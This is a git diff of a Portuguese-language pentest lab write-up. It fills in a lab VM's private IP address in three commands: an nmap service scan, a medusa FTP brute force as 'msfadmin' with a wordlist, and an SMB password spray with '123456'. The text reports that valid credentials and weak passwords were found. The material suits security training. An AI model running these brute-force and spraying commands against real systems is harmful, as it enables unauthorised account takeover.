@@ -23,7 +23,7 @@ Ferramenta: Nmap
 Comando utilizado:
 
 ```
-nmap -sV 192.168.56.X
+nmap -sV 192.168.56.102
 ```
 
 Principais serviços identificados:
@@ -39,7 +39,7 @@ Principais serviços identificados:
 ### 🔐 FTP (Força Bruta)
 
 ```
-medusa -h 192.168.56.X -u msfadmin -P wordlist.txt -M ftp
+medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
 ```
 
 Resultado: credenciais válidas encontradas.
@@ -57,7 +57,7 @@ Resultado: ausência de bloqueio após tentativas inválidas.
 ### 🖥️ SMB (Password Spraying)
 
 ```
-medusa -h 192.168.56.X -U users.txt -p 123456 -M smbnt
+medusa -h 192.168.56.102 -U users.txt -p 123456 -M smbnt
 ```
 
 Resultado: identificação de usuários com senhas fracas.
